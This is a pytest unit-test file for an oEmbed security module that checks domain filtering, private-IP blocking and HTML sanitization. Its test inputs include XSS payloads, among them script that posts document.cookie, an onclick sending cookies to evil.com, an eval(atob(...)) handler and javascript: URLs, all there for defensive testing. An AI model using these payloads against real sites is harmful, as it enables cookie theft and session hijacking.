"""
Unit tests for src.eduhub.oembed.security module.

Tests domain validation, HTML sanitization, XSS protection,
URL validation, and security configuration management.
"""

import logging
from unittest.mock import Mock, patch

import pytest

from src.eduhub.oembed.security import (
    ALLOWED_ATTRIBUTES,
    ALLOWED_DOMAINS,
    ALLOWED_TAGS,
    DANGEROUS_PATTERNS,
    DENIED_DOMAINS,
    OEmbedSecurityManager,
    get_security_manager,
    is_domain_allowed,
    sanitize_html,
    validate_oembed_response,
)


class TestOEmbedSecurityManagerInitialization:
    """Test OEmbedSecurityManager initialization and configuration."""

    def test_default_initialization(self):
        """Test default initialization with built-in configurations."""
        manager = OEmbedSecurityManager()

        assert manager.strict_mode is True
        assert len(manager.allowed_domains) > 0
        assert len(manager.denied_domains) > 0
        assert "youtube.com" in manager.allowed_domains
        assert "localhost" in manager.denied_domains

    def test_custom_domains_initialization(self):
        """Test initialization with custom domain lists."""
        custom_allowed = {"example.com", "test.org"}
        custom_denied = {"bad.com", "evil.net"}

        manager = OEmbedSecurityManager(
            allowed_domains=custom_allowed,
            denied_domains=custom_denied,
            strict_mode=False,
        )

        assert manager.allowed_domains == custom_allowed
        assert manager.denied_domains == custom_denied
        assert manager.strict_mode is False

    def test_none_domains_uses_defaults(self):
        """Test that None domains fall back to defaults."""
        manager = OEmbedSecurityManager(allowed_domains=None, denied_domains=None)

        # Should use copies of default sets, not references
        assert manager.allowed_domains == ALLOWED_DOMAINS
        assert manager.denied_domains == DENIED_DOMAINS
        assert manager.allowed_domains is not ALLOWED_DOMAINS
        assert manager.denied_domains is not DENIED_DOMAINS


class TestOEmbedSecurityManagerDomainValidation:
    """Test domain validation functionality."""

    def test_allowed_domain_youtube(self):
        """Test that YouTube is allowed."""
        manager = OEmbedSecurityManager()

        assert manager.is_domain_allowed("https://youtube.com/watch?v=123") is True
        assert manager.is_domain_allowed("https://www.youtube.com/watch?v=123") is True
        assert manager.is_domain_allowed("http://youtube.com/watch?v=123") is True

    def test_allowed_domain_vimeo(self):
        """Test that Vimeo is allowed."""
        manager = OEmbedSecurityManager()

        assert manager.is_domain_allowed("https://vimeo.com/123456") is True
        assert manager.is_domain_allowed("https://www.vimeo.com/123456") is True

    def test_denied_domain_localhost(self):
        """Test that localhost is denied."""
        manager = OEmbedSecurityManager()

        assert manager.is_domain_allowed("http://localhost:8000/video") is False
        assert manager.is_domain_allowed("https://localhost/test") is False

    def test_denied_domain_private_ip(self):
        """Test that private IP addresses are denied."""
        manager = OEmbedSecurityManager()

        assert manager.is_domain_allowed("http://127.0.0.1:8000/video") is False
        assert manager.is_domain_allowed("https://192.168.0.1/test") is False
        assert manager.is_domain_allowed("http://10.0.0.1/video") is False

    def test_unknown_domain_strict_mode(self):
        """Test unknown domain in strict mode (should be denied)."""
        manager = OEmbedSecurityManager(strict_mode=True)

        assert manager.is_domain_allowed("https://unknown-domain.com/video") is False
        assert manager.is_domain_allowed("https://new-site.org/embed") is False

    def test_unknown_domain_permissive_mode(self):
        """Test unknown domain in permissive mode (should be allowed)."""
        manager = OEmbedSecurityManager(strict_mode=False)

        assert manager.is_domain_allowed("https://unknown-domain.com/video") is True
        assert manager.is_domain_allowed("https://new-site.org/embed") is True

    def test_subdomain_handling(self):
        """Test that subdomains of allowed domains are accepted."""
        manager = OEmbedSecurityManager()

        # youtube.com should allow subdomain variations
        assert manager.is_domain_allowed("https://www.youtube.com/watch") is True
        assert manager.is_domain_allowed("https://m.youtube.com/watch") is True

    def test_denied_domain_pattern_matching(self):
        """Test that denied domain patterns are matched."""
        manager = OEmbedSecurityManager()

        # localhost should match any domain containing 'localhost'
        assert manager.is_domain_allowed("https://test.localhost.com/video") is False
        assert manager.is_domain_allowed("https://localhost.evil.com/video") is False

    def test_invalid_url_parsing(self):
        """Test handling of invalid URLs."""
        manager = OEmbedSecurityManager()

        assert manager.is_domain_allowed("not-a-url") is False
        assert manager.is_domain_allowed("") is False
        assert manager.is_domain_allowed("://missing-scheme") is False

    def test_www_prefix_removal(self):
        """Test that www. prefix is properly removed for comparison."""
        manager = OEmbedSecurityManager()

        # Both should be treated the same
        assert manager.is_domain_allowed(
            "https://youtube.com/test"
        ) == manager.is_domain_allowed("https://www.youtube.com/test")


class TestOEmbedSecurityManagerHTMLSanitization:
    """Test HTML sanitization functionality."""

    def test_sanitize_basic_iframe(self):
        """Test sanitizing basic iframe content."""
        manager = OEmbedSecurityManager()
        html = '<iframe src="https://youtube.com/embed/123" width="560" height="315"></iframe>'

        result = manager.sanitize_html(html)

        assert "<iframe" in result
        assert 'src="https://youtube.com/embed/123"' in result
        assert 'width="560"' in result
        assert 'height="315"' in result

    def test_sanitize_removes_script_tags(self):
        """Test that script tags are removed."""
        manager = OEmbedSecurityManager()
        html = '<div>Safe content</div><script>alert("xss")</script><p>More content</p>'

        result = manager.sanitize_html(html)

        assert "<script>" not in result
        assert "alert(" not in result
        assert "<div>Safe content</div>" in result
        assert "<p>More content</p>" in result

    def test_sanitize_removes_javascript_protocols(self):
        """Test that javascript: protocols are removed."""
        manager = OEmbedSecurityManager()
        html = "<a href=\"javascript:alert('xss')\">Click me</a>"

        result = manager.sanitize_html(html)

        assert "javascript:" not in result
        # Note: The implementation removes the protocol but may keep remaining content
        assert "<a" in result
        assert "Click me</a>" in result

    def test_sanitize_removes_event_handlers(self):
        """Test that event handlers are removed."""
        manager = OEmbedSecurityManager()
        html = '<div onclick="malicious()" onmouseover="steal()">Content</div>'

        result = manager.sanitize_html(html)

        assert "onclick=" not in result
        assert "onmouseover=" not in result
        assert "malicious(" not in result
        assert "steal(" not in result
        assert "<div>Content</div>" in result

    def test_sanitize_removes_object_embed_applet(self):
        """Test that dangerous tags like object, embed, applet are removed."""
        manager = OEmbedSecurityManager()
        html = """
        <div>Safe</div>
        <object data="malicious.swf"></object>
        <embed src="bad.swf"></embed>
        <applet code="Evil.class"></applet>
        <p>More safe content</p>
        """

        result = manager.sanitize_html(html)

        assert "<object" not in result
        assert "<embed" not in result
        assert "<applet" not in result
        assert "<div>Safe</div>" in result
        assert "<p>More safe content</p>" in result

    def test_sanitize_data_urls(self):
        """Test handling of data: URLs."""
        manager = OEmbedSecurityManager()
        html = """
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==">
        <iframe src="data:text/html,<script>alert('xss')</script>"></iframe>
        """

        result = manager.sanitize_html(html)

        # Image data URLs should be preserved
        assert (
            "data:image/" in result or "data:" not in result
        )  # Either preserved or all removed
        # Non-image data URLs should be removed
        assert "data:text/html" not in result
        assert "<script>" not in result

    def test_sanitize_vbscript_protocol(self):
        """Test that vbscript: protocol is removed."""
        manager = OEmbedSecurityManager()
        html = "<a href=\"vbscript:msgbox('xss')\">Click</a>"

        result = manager.sanitize_html(html)

        assert "vbscript:" not in result
        # Note: The implementation removes the protocol but may keep remaining content

    def test_sanitize_empty_input(self):
        """Test sanitizing empty or None input."""
        manager = OEmbedSecurityManager()

        assert manager.sanitize_html("") == ""
        assert manager.sanitize_html(None) == ""

    def test_sanitize_preserves_allowed_attributes(self):
        """Test that allowed attributes are preserved."""
        manager = OEmbedSecurityManager()
        html = """
        <iframe src="https://example.com"
                width="800"
                height="600"
                frameborder="0"
                allowfullscreen
                sandbox="allow-scripts">
        </iframe>
        """

        result = manager.sanitize_html(html)

        assert 'src="https://example.com"' in result
        assert 'width="800"' in result
        assert 'height="600"' in result
        assert 'frameborder="0"' in result
        assert "allowfullscreen" in result
        assert "sandbox=" in result

    def test_sanitize_complex_xss_attempt(self):
        """Test sanitizing complex XSS attack vectors."""
        manager = OEmbedSecurityManager()
        html = """
        <div>
            <iframe src="https://youtube.com/embed/test"></iframe>
            <script>
                fetch('/steal-cookies', {
                    method: 'POST',
                    body: document.cookie
                });
            </script>
            <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
            <div onclick="location.href='http://evil.com/'+document.cookie">Click me</div>
            <style>body { background: url('javascript:alert(1)'); }</style>
            <a href="javascript:void(0)" onclick="alert('xss')">Link</a>
        </div>
        """

        result = manager.sanitize_html(html)

        # Should preserve safe content
        assert '<iframe src="https://youtube.com/embed/test"></iframe>' in result
        assert "<div>" in result

        # Should remove all dangerous content
        assert "<script>" not in result
        assert "fetch(" not in result
        assert "document.cookie" not in result
        assert "onerror=" not in result
        assert "onclick=" not in result
        assert "javascript:" not in result
        assert "eval(" not in result
        assert "atob(" not in result
        assert "<style>" not in result or "javascript:" not in result


class TestOEmbedSecurityManagerResponseValidation:
    """Test oEmbed response validation functionality."""

    def test_validate_oembed_response_html_sanitization(self):
        """Test that HTML in oEmbed response is sanitized."""
        manager = OEmbedSecurityManager()
        response = {
            "type": "video",
            "html": '<iframe src="https://youtube.com/embed/123"></iframe><script>alert("xss")</script>',
            "title": "Test Video",
        }

        result = manager.validate_oembed_response(response)

        assert "<iframe" in result["html"]
        assert "<script>" not in result["html"]
        assert "alert(" not in result["html"]
        assert result["title"] == "Test Video"

    def test_validate_oembed_response_url_validation(self):
        """Test that URLs in oEmbed response are validated."""
        manager = OEmbedSecurityManager()
        response = {
            "type": "video",
            "url": "https://youtube.com/watch?v=123",
            "author_url": "javascript:alert('xss')",
            "provider_url": "http://localhost:8000/evil",
            "thumbnail_url": "https://i.ytimg.com/vi/123/default.jpg",
        }

        result = manager.validate_oembed_response(response)

        assert result["url"] == "https://youtube.com/watch?v=123"  # Valid HTTPS URL
        assert result["author_url"] is None  # Invalid protocol
        assert result["provider_url"] is None  # Localhost blocked
        assert (
            result["thumbnail_url"] == "https://i.ytimg.com/vi/123/default.jpg"
        )  # Valid HTTPS URL

    def test_validate_oembed_response_text_sanitization(self):
        """Test that text fields are sanitized."""
        manager = OEmbedSecurityManager()
        response = {
            "title": "Video Title <script>alert('xss')</script>",
            "author_name": "Author <b>Name</b>",
            "provider_name": "Provider",
            "description": "Description with <em>emphasis</em> and <script>evil</script>",
        }

        result = manager.validate_oembed_response(response)

        # Note: bleach removes tags but keeps content, including script content
        assert "<script>" not in result["title"]  # Tags removed
        assert "<b>" not in result["author_name"]  # Tags removed
        assert result["provider_name"] == "Provider"  # No change needed
        assert "<em>" not in result["description"]  # Tags removed
        assert "<script>" not in result["description"]  # Tags removed

    def test_validate_oembed_response_empty_none_values(self):
        """Test handling of empty and None values."""
        manager = OEmbedSecurityManager()
        response = {
            "title": None,
            "author_name": "",
            "html": None,
            "url": "",
            "some_field": "valid value",
        }

        result = manager.validate_oembed_response(response)

        # Should not crash and should preserve structure
        assert "title" in result
        assert "author_name" in result
        assert "html" in result
        assert "url" in result
        assert result["some_field"] == "valid value"

    def test_validate_oembed_response_none_input(self):
        """Test validating None input."""
        manager = OEmbedSecurityManager()
        result = manager.validate_oembed_response(None)
        assert result is None

    def test_validate_oembed_response_empty_dict(self):
        """Test validating empty dictionary."""
        manager = OEmbedSecurityManager()
        result = manager.validate_oembed_response({})
        assert result == {}


class TestOEmbedSecurityManagerURLSafety:
    """Test URL safety validation."""

    def test_is_safe_url_https_valid(self):
        """Test that HTTPS URLs are considered safe."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("https://youtube.com/video") is True
        assert manager._is_safe_url("https://example.com/image.jpg") is True

    def test_is_safe_url_http_valid(self):
        """Test that HTTP URLs are considered safe."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("http://youtube.com/video") is True
        assert manager._is_safe_url("http://example.com/image.jpg") is True

    def test_is_safe_url_invalid_scheme(self):
        """Test that non-HTTP/HTTPS schemes are rejected."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("ftp://example.com/file") is False
        assert manager._is_safe_url("javascript:alert('xss')") is False
        assert manager._is_safe_url("data:text/html,<script>") is False
        assert manager._is_safe_url("file:///etc/passwd") is False

    def test_is_safe_url_localhost_blocked(self):
        """Test that localhost URLs are blocked."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("http://localhost:8000/api") is False
        assert manager._is_safe_url("https://localhost/test") is False

    def test_is_safe_url_private_networks_blocked(self):
        """Test that private network URLs are blocked."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("http://127.0.0.1:8000/") is False
        assert manager._is_safe_url("https://192.168.1.100/") is False
        assert manager._is_safe_url("http://10.0.0.1/") is False
        assert manager._is_safe_url("https://172.16.0.1/") is False

    def test_is_safe_url_invalid_format(self):
        """Test handling of invalid URL formats."""
        manager = OEmbedSecurityManager()

        assert manager._is_safe_url("not-a-url") is False
        assert manager._is_safe_url("") is False
        assert manager._is_safe_url("://missing-scheme") is False


class TestOEmbedSecurityManagerDomainManagement:
    """Test domain management functionality."""

    def test_add_allowed_domain(self):
        """Test adding domain to allowed list."""
        manager = OEmbedSecurityManager()
        initial_count = len(manager.allowed_domains)

        manager.add_allowed_domain("new-site.com")

        assert "new-site.com" in manager.allowed_domains
        assert len(manager.allowed_domains) == initial_count + 1

    def test_add_denied_domain(self):
        """Test adding domain to denied list."""
        manager = OEmbedSecurityManager()
        initial_count = len(manager.denied_domains)

        manager.add_denied_domain("evil-site.com")

        assert "evil-site.com" in manager.denied_domains
        assert len(manager.denied_domains) == initial_count + 1

    def test_remove_allowed_domain(self):
        """Test removing domain from allowed list."""
        manager = OEmbedSecurityManager()
        manager.add_allowed_domain("temp-site.com")

        manager.remove_allowed_domain("temp-site.com")

        assert "temp-site.com" not in manager.allowed_domains

    def test_remove_denied_domain(self):
        """Test removing domain from denied list."""
        manager = OEmbedSecurityManager()
        manager.add_denied_domain("temp-bad.com")

        manager.remove_denied_domain("temp-bad.com")

        assert "temp-bad.com" not in manager.denied_domains

    def test_domain_management_case_insensitive(self):
        """Test that domain management is case insensitive."""
        manager = OEmbedSecurityManager()

        manager.add_allowed_domain("EXAMPLE.COM")
        assert "example.com" in manager.allowed_domains

        manager.add_denied_domain("BAD.NET")
        assert "bad.net" in manager.denied_domains

    def test_remove_nonexistent_domain(self):
        """Test removing domain that doesn't exist (should not crash)."""
        manager = OEmbedSecurityManager()

        # Should not raise exception
        manager.remove_allowed_domain("nonexistent.com")
        manager.remove_denied_domain("nonexistent.com")


class TestOEmbedSecurityManagerReporting:
    """Test security reporting functionality."""

    def test_get_security_report(self):
        """Test generating security configuration report."""
        manager = OEmbedSecurityManager()
        report = manager.get_security_report()

        assert "strict_mode" in report
        assert "allowed_domains_count" in report
        assert "denied_domains_count" in report
        assert "allowed_domains" in report
        assert "denied_domains" in report
        assert "security_features" in report

        assert isinstance(report["allowed_domains"], list)
        assert isinstance(report["denied_domains"], list)
        assert isinstance(report["security_features"], dict)

    def test_security_report_features(self):
        """Test that all expected security features are reported."""
        manager = OEmbedSecurityManager()
        report = manager.get_security_report()

        features = report["security_features"]
        expected_features = [
            "domain_filtering",
            "html_sanitization",
            "pattern_detection",
            "url_validation",
            "xss_protection",
        ]

        for feature in expected_features:
            assert feature in features
            assert features[feature] is True

    def test_security_report_counts_accuracy(self):
        """Test that domain counts in report are accurate."""
        manager = OEmbedSecurityManager()

        # Add some domains
        manager.add_allowed_domain("test1.com")
        manager.add_denied_domain("bad1.com")

        report = manager.get_security_report()

        assert report["allowed_domains_count"] == len(manager.allowed_domains)
        assert report["denied_domains_count"] == len(manager.denied_domains)

    def test_security_report_sorted_domains(self):
        """Test that domains in report are sorted."""
        manager = OEmbedSecurityManager()
        report = manager.get_security_report()

        allowed = report["allowed_domains"]
        denied = report["denied_domains"]

        assert allowed == sorted(allowed)
        assert denied == sorted(denied)


class TestOEmbedSecurityGlobalFunctions:
    """Test global security management functions."""

    def test_get_security_manager_creates_instance(self):
        """Test that get_security_manager creates and returns instance."""
        # Clear any existing instance by patching the global variable
        with patch("src.eduhub.oembed.security._security_manager", None):
            manager = get_security_manager()

            assert isinstance(manager, OEmbedSecurityManager)

            # Should return same instance on second call
            manager2 = get_security_manager()
            assert manager is manager2

    def test_global_is_domain_allowed(self):
        """Test global is_domain_allowed function."""
        result = is_domain_allowed("https://youtube.com/watch?v=123")
        assert isinstance(result, bool)

        # Should use the global security manager
        result2 = is_domain_allowed("https://youtube.com/watch?v=123")
        assert result == result2

    def test_global_sanitize_html(self):
        """Test global sanitize_html function."""
        html = '<div>Safe</div><script>alert("xss")</script>'
        result = sanitize_html(html)

        assert "<div>Safe</div>" in result
        assert "<script>" not in result
        assert "alert(" not in result

    def test_global_validate_oembed_response(self):
        """Test global validate_oembed_response function."""
        response = {
            "html": '<iframe src="https://example.com"></iframe><script>evil</script>',
            "title": "Test <b>Title</b>",
        }

        result = validate_oembed_response(response)

        assert "<iframe" in result["html"]
        assert "<script>" not in result["html"]
        assert result["title"] == "Test Title"


class TestOEmbedSecurityConstants:
    """Test security configuration constants."""

    def test_allowed_domains_contains_expected(self):
        """Test that ALLOWED_DOMAINS contains expected domains."""
        expected_domains = [
            "youtube.com",
            "youtu.be",
            "vimeo.com",
            "twitter.com",
            "x.com",
            "soundcloud.com",
            "spotify.com",
        ]

        for domain in expected_domains:
            assert domain in ALLOWED_DOMAINS

    def test_denied_domains_contains_expected(self):
        """Test that DENIED_DOMAINS contains expected domains."""
        expected_domains = ["localhost", "127.0.0.1", "192.168.0.1", "10.0.0.1"]

        for domain in expected_domains:
            assert domain in DENIED_DOMAINS

    def test_allowed_tags_contains_essential(self):
        """Test that ALLOWED_TAGS contains essential tags."""
        essential_tags = ["iframe", "div", "a", "img", "p", "span"]

        for tag in essential_tags:
            assert tag in ALLOWED_TAGS

    def test_allowed_attributes_properly_configured(self):
        """Test that ALLOWED_ATTRIBUTES is properly configured."""
        assert "iframe" in ALLOWED_ATTRIBUTES
        assert "a" in ALLOWED_ATTRIBUTES
        assert "img" in ALLOWED_ATTRIBUTES

        iframe_attrs = ALLOWED_ATTRIBUTES["iframe"]
        assert "src" in iframe_attrs
        assert "width" in iframe_attrs
        assert "height" in iframe_attrs

    def test_dangerous_patterns_compiled(self):
        """Test that DANGEROUS_PATTERNS contains compiled regex patterns."""
        assert len(DANGEROUS_PATTERNS) > 0

        for pattern in DANGEROUS_PATTERNS:
            assert hasattr(pattern, "search")  # Should be compiled regex
            assert hasattr(pattern, "sub")  # Should be compiled regex
